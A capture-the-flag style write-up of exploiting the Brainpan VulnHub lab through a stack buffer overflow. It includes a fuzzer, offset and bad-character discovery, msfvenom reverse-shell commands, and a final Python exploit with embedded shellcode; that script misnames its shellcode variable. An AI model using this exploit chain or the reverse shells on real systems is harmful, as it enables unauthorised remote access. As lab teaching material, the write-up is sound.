# BrainPan BufferOverflow VulnHub Machine 
Hello! I'm [Mohamed](https://twitter.com/0xMohomiester) This is My WriteUp for Brainpan BufferOverflow VulnHub Machine ok Let's start with download machine from [VulnHub Brainpan](https://www.vulnhub.com/entry/brainpan-1,51/) and setup it on vmware or virtual box as you like I already finished the setup you shoud see :

![brainp](https://user-images.githubusercontent.com/47929033/130876624-1b4dc000-bcb9-467c-87db-30b5ec3af179.png)

That's great Let's start with enumeration I need to know ip address of machine so i will use command 
`sudo netdiscover` to find ip address: 

![Screen Shot 2021-08-26 at 12 44 34 AM](https://user-images.githubusercontent.com/47929033/130876911-b5242212-661d-4646-989c-c8772a9b85d2.png)

as you can see the ip address: `192.168.1.13` with `vmware,inc` hostname now we need to perform port scanning I will use nmap to scan for open port and service on machinewith command:

`sudo nmap 192.168.1.13` : 

![Screen Shot 2021-08-26 at 12 48 27 AM](https://user-images.githubusercontent.com/47929033/130877152-5af6c1f5-28b4-4bc2-bc16-dc239560a2c5.png) 

as you can see two ports are open `9999,10000` let's check port `9999` with netcat using command 
`nc -nvv 192.168.1.13 9999`:

![Screen Shot 2021-08-26 at 12 49 00 AM](https://user-images.githubusercontent.com/47929033/130877337-dbaddc9d-fb3c-4a03-add2-ed49cbea2e7e.png)

as you can see this is the vulnerable service: `Brainpan`,maybe port `10000` is web server let's check it with open it in web browser: 

![Screen Shot 2021-08-26 at 12 49 20 AM](https://user-images.githubusercontent.com/47929033/130877350-d1d98332-3831-4c9b-a820-031966af52d9.png) 

That's Great, It's web server that run on port `10000` now we need to discover some interesting directories that hidden in webiste by using Gobuster using command: 
`gobuster dir  --url http://192.168.1.13:10000/  -w /home/kali/Desktop/directory-list-2.3-medium.txt`

![Screen Shot 2021-08-26 at 12 40 56 AM](https://user-images.githubusercontent.com/47929033/130877722-9c037be4-a6f8-4f5d-8e69-5cd6e10d891e.png)

as you can see i found directory `/bin` let me see in browser: 

![Screen Shot 2021-08-26 at 12 40 35 AM](https://user-images.githubusercontent.com/47929033/130877992-ccdee6c7-91a5-4197-8106-e54b5839a92c.png)

oh! it's e executable file now we need to switch to windows machine on vmware to run programe
I will tranfer the programe to windows machine and run it: 

![Screen Shot 2021-08-26 at 1 43 00 AM](https://user-images.githubusercontent.com/47929033/130878391-e18acbce-e348-4f65-b4a3-cbdb54794f49.png)

as you can see the programe listen on port 9999 and waitin for connection, we need [Immunity Debugger](https://debugger.immunityinc.com/) to open application and see how it works During exploition phase
I already download it , I will open and run it as administrator to attach service: 

![Screen Shot 2021-08-26 at 1 49 10 AM](https://user-images.githubusercontent.com/47929033/130878958-189b07db-6e2d-41bd-a594-fe77294799a0.png) 

as you can see service name: `Brainpan` with PID `2108` after attack it run programe from `F9` in your keyboard and make sure that the programe is running in the right down side: 

![Screen Shot 2021-08-26 at 1 49 38 AM](https://user-images.githubusercontent.com/47929033/130879173-18bcdd76-6286-44f6-836a-95ea16152d9a.png)

as you can see programe runing we need now to Discover bufferoverflow vulnerability using fuzzing in my Kali Linux attacking machine I written simple fuzzer using python: 

```
#!/usr/bin/python

import socket 

counter = 100

ip = "192.168.1.15"

port = 9999

while (counter<=5012):
      
     print("payload sent")

     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
     payload = 'A' * counter
   
     s.connect((ip, port))

     s.send(payload + "\r\n")
     
     s.recv(1024)
     
     s.close()
     
     counter+=100
    
     print(payload + "\n")

print(len(payload))
```

That's Great Let's run our fuzzer to Discover crash on application: 

![Screen Shot 2021-08-26 at 2 06 17 AM](https://user-images.githubusercontent.com/47929033/130880235-d06b1266-0fa1-40c3-8cfa-4f5e77a413b9.png) 

as you can see fuzzer stoped with string of `AAA` how to know number of `A` ? it's very simple let me to create a file with `touch aa.txt` and copy string to file and use command: `cat aa.txt | wc -c`:

![Screen Shot 2021-08-26 at 2 07 45 AM](https://user-images.githubusercontent.com/47929033/130880433-95cb1c84-9dcc-4192-b79b-173a7490b81c.png)

as you can see tha programe crashed and EIP register: `41414141`

![Screen Shot 2021-08-26 at 2 06 32 AM](https://user-images.githubusercontent.com/47929033/130881445-09e4193f-8c01-4a6e-8116-6cbcea6d23fc.png)

The string that crashed applicaton: `600` of `A`, That's Great now we can write a exploit to know which four bytes that OverWrtie `EIP`: 

### Hint : CTRL+F2 to restart debugger and service and F9 to run Immunity debugger 

exploit:

```
#!/usr/bin/python 
import socket 

buffer = 'A' * 600 

print 'payload sent'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

s.connect(('192.168.1.15',9999))

s.send(buffer + "\r\n")

s.recv(1024)

s.close()

```
I will run exploit to see the programe crash or not : 

![Screen Shot 2021-08-26 at 2 26 21 AM](https://user-images.githubusercontent.com/47929033/130881239-d8dcb070-d15a-480c-adfb-fd28dacba624.png)

as you can see the programe crashed Now, let's create a unique string with `msf-pattern-create`, using command: `msf-pattern_create -l 600` and copy the unique string to exploit :

![Screen Shot 2021-08-26 at 2 35 02 AM](https://user-images.githubusercontent.com/47929033/130881775-6f0d9492-07ad-4060-b0af-083e2ef4c33b.png)

as you can see the programe crashed at EIP: `35724134` we can now use `msf-pattern-offset`
to know which four bytes that OverWrite `EIP` by using command `msf-pattern_offset -q 35724134`:

```
[*] Exact match at offset 524
```
Now we need to OverWrite EIP with `BBBB` i will send `524 * A` + `BBBB` + `72 * C` 
then Total Length: 600 then exploit should be: 

![Screen Shot 2021-08-26 at 2 50 19 AM](https://user-images.githubusercontent.com/47929033/130882763-af86b608-bbc4-4d07-9a6d-8f33c9a74b48.png)

let's run exploit to see the crash:

![Screen Shot 2021-08-26 at 12 59 09 PM](https://user-images.githubusercontent.com/47929033/130951288-663f42f7-c034-4222-9885-2b42cf3f1524.png)

as you can see we can control EIP register with `BBBB` that's Great, now we need to find `JMP ESP` register to execute our shellcode in the application to get shell we can use [mona.py](https://github.com/corelan/mona) to do this operation, first I will use command: `!mona modules` to find mosules  that don't have ASLR and DES: 

![Screen Shot 2021-08-26 at 1 06 26 PM](https://user-images.githubusercontent.com/47929033/130952539-25118c43-c5f0-4010-99d0-fd3a529296aa.png)

as you can see this is module, we will use module with have `SafeSEH:false and ASLR: false`  `brainpan.exe` but we need to use `msf-nasm-shell` to know the code of `JMP ESP register` we can use command: `msf-nasm-shell`
then type `JMP ESP`, Just Like the image Below: 

![Screen Shot 2021-08-26 at 1 15 29 PM](https://user-images.githubusercontent.com/47929033/130953400-3f30e6ab-5c8e-4167-a8ea-b6d82994bddb.png)

Now we can use mona command: `!mona find -s '\xff\xe4' -m barinpan.exe` : 

![Screen Shot 2021-08-26 at 1 19 40 PM](https://user-images.githubusercontent.com/47929033/130954379-c392d007-48f1-4fdf-b398-84ee0183f380.png)

as you can see the address is `0x311712f3` that's Great we need Now to Discover Badchar that cutting shellcode and can break code execution let's learn how to know `Badchar`, you can create a string of most common badchar with followin python code:

```
import sys
for x in range(0,256):
    sys.stdout.write("\\x" + '{:02x}'.format(x))
```
![Screen Shot 2021-08-26 at 1 54 23 PM](https://user-images.githubusercontent.com/47929033/130958481-3cf9d696-e6c7-4286-968a-abe0a2ea719d.png)

as you can see this is badchar string let's copy it to exploit and send it: 

![Screen Shot 2021-08-26 at 1 55 00 PM](https://user-images.githubusercontent.com/47929033/130958516-e041043b-8131-4c05-ac17-95661423f976.png)

let's run our exploit to see how to know badchar from stack: 

![Screen Shot 2021-08-26 at 1 57 51 PM](https://user-images.githubusercontent.com/47929033/130958838-d17cc991-c88a-4031-902a-754db2742c1d.png)

as you can see programe crashed then go to ESP `Stack Pointer` to see our payload in stack and right click > `follow in dump`: 

![Screen Shot 2021-08-26 at 2 01 35 PM](https://user-images.githubusercontent.com/47929033/130960475-f43bfb48-2eca-42da-b4bd-fdd93a1d542a.png)

as you can see after last `C` the string was truncated , if I removed `"\x00"` from exploit - resutlt:

![Screen Shot 2021-08-26 at 2 09 25 PM](https://user-images.githubusercontent.com/47929033/130960229-6324294c-e7ef-4ed1-9035-1cf3fbb5d8f1.png)

as you can see the string are in the stack without any truncated from `"\x01\x02"` to `"\xff"`: 
there is no any other badchar in string only `"\x00"` is NullByte now we need to create shellcode with msfvenom to gaining access on system using command: 

`msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.3 LPORT=443  -b "\x00"  -f c`
but we have a problem total length = 600 - and service crashed after `524 bytes + JMP esp address` 
we don't have space to shellcode we can try to ad 100 bytes of `NOPS` --> `\x90` and then shellocde then the total lenght = `524 + 4 + 100 + 351 =  979`, then exploit: 

```
#!/usr/bin/python 
import socket 

# JMP ESP:"0x311712f3"
# total length: 600
# EIP OverWrite: 524 
# "A" * 524 + "BBBB" + "C" * 72 

shellcde = ("\xda\xd3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb8\x6b\x5c\x9f\x9c\xb1"
"\x52\x31\x43\x17\x83\xeb\xfc\x03\x28\x4f\x7d\x69\x52\x87\x03"
"\x92\xaa\x58\x64\x1a\x4f\x69\xa4\x78\x04\xda\x14\x0a\x48\xd7"
"\xdf\x5e\x78\x6c\xad\x76\x8f\xc5\x18\xa1\xbe\xd6\x31\x91\xa1"
"\x54\x48\xc6\x01\x64\x83\x1b\x40\xa1\xfe\xd6\x10\x7a\x74\x44"
"\x84\x0f\xc0\x55\x2f\x43\xc4\xdd\xcc\x14\xe7\xcc\x43\x2e\xbe"
"\xce\x62\xe3\xca\x46\x7c\xe0\xf7\x11\xf7\xd2\x8c\xa3\xd1\x2a"
"\x6c\x0f\x1c\x83\x9f\x51\x59\x24\x40\x24\x93\x56\xfd\x3f\x60"
"\x24\xd9\xca\x72\x8e\xaa\x6d\x5e\x2e\x7e\xeb\x15\x3c\xcb\x7f"
"\x71\x21\xca\xac\x0a\x5d\x47\x53\xdc\xd7\x13\x70\xf8\xbc\xc0"
"\x19\x59\x19\xa6\x26\xb9\xc2\x17\x83\xb2\xef\x4c\xbe\x99\x67"
"\xa0\xf3\x21\x78\xae\x84\x52\x4a\x71\x3f\xfc\xe6\xfa\x99\xfb"
"\x09\xd1\x5e\x93\xf7\xda\x9e\xba\x33\x8e\xce\xd4\x92\xaf\x84"
"\x24\x1a\x7a\x0a\x74\xb4\xd5\xeb\x24\x74\x86\x83\x2e\x7b\xf9"
"\xb4\x51\x51\x92\x5f\xa8\x32\x5d\x37\xb3\xc1\x35\x4a\xb3\xc4"
"\x7e\xc3\x55\xac\x90\x82\xce\x59\x08\x8f\x84\xf8\xd5\x05\xe1"
"\x3b\x5d\xaa\x16\xf5\x96\xc7\x04\x62\x57\x92\x76\x25\x68\x08"
"\x1e\xa9\xfb\xd7\xde\xa4\xe7\x4f\x89\xe1\xd6\x99\x5f\x1c\x40"
"\x30\x7d\xdd\x14\x7b\xc5\x3a\xe5\x82\xc4\xcf\x51\xa1\xd6\x09"
"\x59\xed\x82\xc5\x0c\xbb\x7c\xa0\xe6\x0d\xd6\x7a\x54\xc4\xbe"
"\xfb\x96\xd7\xb8\x03\xf3\xa1\x24\xb5\xaa\xf7\x5b\x7a\x3b\xf0"
"\x24\x66\xdb\xff\xff\x22\xeb\xb5\x5d\x02\x64\x10\x34\x16\xe9"
"\xa3\xe3\x55\x14\x20\x01\x26\xe3\x38\x60\x23\xaf\xfe\x99\x59"
"\xa0\x6a\x9d\xce\xc1\xbe")  # 351 bytes

buffer = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 100 +  shellcode 	

print 'payload sent'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

s.connect(('192.168.1.15',9999))

s.send(buffer + "\r\n")

s.recv(1024)

s.close() 

```

after sending exploit : 

![Screen Shot 2021-10-19 at 4 53 29 PM](https://user-images.githubusercontent.com/47929033/137936267-f64d6d18-8243-467e-a507-c6205868a741.png)

let's perform exploit with another shellcode (linux) on the brainpan machine to exploit it 
use the following command to create a linux shellcode : 

`msfvenom --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.1.5 LPORT=443 -b "\x00" -f c  -e x86/shikata_ga_nai`

as you can see : 

![Screen Shot 2021-10-19 at 5 16 11 PM](https://user-images.githubusercontent.com/47929033/137940464-12d650d3-7811-4b94-aaac-0ad4ca621536.png)

copy the shellcode to exploit and run exploit by changing ip address then final exploit : 

![Screen Shot 2021-10-19 at 5 32 12 PM](https://user-images.githubusercontent.com/47929033/137943442-9e2c3e39-24a8-4b47-ad65-a5eda74b31b3.png)

Run exploit again and listen on port 443 to get a reverse shell using netcat : 

![Screen Shot 2021-10-19 at 5 22 08 PM](https://user-images.githubusercontent.com/47929033/137941985-09e8d509-2717-4f0d-b1c2-21aa0a00e6e3.png)

as you can see we are now into the machine with user puck ...:) Hope you to understand how to perform bufferoverflow attack, If you have any question you can contact me to [Twitter](https://twitter.com/0xMohomiester)
